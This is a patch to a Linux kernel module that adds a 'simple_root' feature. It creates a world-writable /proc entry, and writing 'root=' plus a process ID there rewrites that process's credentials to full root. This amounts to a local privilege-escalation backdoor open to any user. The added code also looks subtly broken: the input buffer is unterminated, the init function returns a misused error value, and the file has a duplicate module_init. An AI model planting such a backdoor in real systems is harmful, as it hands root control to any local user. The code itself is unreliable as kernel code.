@@ -150,7 +150,119 @@ static void __exit sln_trace_exit(void)
 
 module_init(sln_trace_init);
 module_exit(sln_trace_exit);
-#endif /* SIMPLE_LOOKUP_NAME_PROC */
+#endif /* CONFIG_SIMPLE_LOOKUP_NAME_PROC */
+
+#if IS_ENABLED(CONFIG_SIMPLE_ROOT)
+#include <linux/proc_fs.h>
+#include <linux/seq_file.h>
+#include <linux/sched.h>
+#include <linux/cred.h>
+#include <linux/uidgid.h>
+#include <linux/pid.h>
+
+NGKI_DECLARE(NGKI_SYM(commit_creds));
+
+static int become_root(pid_t nr)
+{
+	struct task_struct *target_task;
+	struct cred *new_cred;
+	struct pid *pid_struct;
+
+	pid_struct = find_get_pid(nr);
+	if (!pid_struct) {
+		pr_err("cannot find PID=%d\n", nr);
+		return -ESRCH;
+	}
+
+	target_task = pid_task(pid_struct, PIDTYPE_PID);
+	if (!target_task) {
+		pr_err("cannot find task for PID=%d\n", nr);
+		put_pid(pid_struct);
+		return -ESRCH;
+	}
+
+	pr_info("PID=%d original UID: %d, original EUID: %d\n", nr,
+		target_task->cred->uid.val, target_task->cred->euid.val);
+
+	new_cred = prepare_kernel_cred(target_task);
+	if (!new_cred) {
+		pr_err("cannot prepare new credentials for PID=%d\n", nr);
+		put_pid(pid_struct);
+		return -ENOMEM;
+	}
+
+	new_cred->uid = new_cred->euid = new_cred->suid = new_cred->fsuid =
+		GLOBAL_ROOT_UID;
+	new_cred->gid = new_cred->egid = new_cred->sgid = new_cred->fsgid =
+		GLOBAL_ROOT_GID;
+
+	NGKI_CALL(commit_creds, new_cred);
+
+	pr_info("PID=%d modified to root user: UID=%d, EUID=%d\n", nr,
+		target_task->cred->uid.val, target_task->cred->euid.val);
+
+	put_pid(pid_struct);
+	return 0;
+}
+
+static ssize_t simple_root_write(struct file *filp, const char *ubuf,
+				 size_t cnt, loff_t *data)
+{
+	char buf[32];
+
+	if (cnt >= sizeof(buf))
+		return -EINVAL;
+
+	if (copy_from_user(&buf, ubuf, cnt))
+		return -EFAULT;
+
+	if (strstr(buf, "root=") == buf) {
+		pid_t nr = simple_strtol(buf + strlen("root="), NULL, 10);
+		if (nr > 0) {
+			int ret = become_root(nr);
+			if (ret < 0)
+				pr_err("Failed to become root for PID %d\n",
+				       nr);
+			else
+				pr_info("Became root for PID %d\n", nr);
+		} else {
+			pr_err("Invalid PID: %s\n", &buf[4]);
+		}
+	}
+
+	return cnt;
+}
+
+static int simple_root_show(struct seq_file *m, void *v)
+{
+	seq_puts(m, "---test---\n");
+
+	return 0;
+}
+
+static int simple_root_open(struct inode *inode, struct file *file)
+{
+	return single_open(file, simple_root_show, inode->i_private);
+}
+
+static const struct proc_ops simple_root_fops = {
+	.proc_open = simple_root_open,
+	.proc_write = simple_root_write,
+	.proc_read = seq_read,
+	.proc_lseek = seq_lseek,
+	.proc_release = single_release,
+};
+
+static int __init simple_root_init(void)
+{
+	if (NGKI_GET_FUNC(commit_creds))
+		return -ENOSYS;
+
+	return PTR_ERR(
+		proc_create("simple_root", 0666, NULL, &simple_root_fops));
+}
+module_init(simple_root_init);
+#endif /* CONFIG_SIMPLE_ROOT */
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Casey");
